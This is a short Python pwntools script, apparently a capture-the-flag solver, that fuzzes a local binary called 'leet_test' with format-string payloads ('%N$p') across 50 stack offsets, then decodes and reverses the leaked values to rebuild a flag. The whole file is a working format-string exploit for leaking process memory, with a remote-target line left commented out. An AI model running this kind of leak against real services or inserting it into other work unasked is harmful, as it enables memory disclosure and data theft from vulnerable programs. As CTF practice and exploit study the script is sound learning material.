from pwn import *

context.log_level = 'info'

result = ''

# Let's fuzz x values
for i in range(1, 51):
    try:
        # Connect to server
        #io = remote('localhost', 1337, level='warn')
        io = process('./leet_test')
        io.recvuntil('Please enter your name: ')
        io.sendline('%{}$p'.format(i).encode())
        io.recvuntil(b'Hello, ')
        vuln = io.recv()
        if not b'nil' in vuln:
            print(str(i) + ': ' + str(vuln))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(vuln.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                result += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(result)
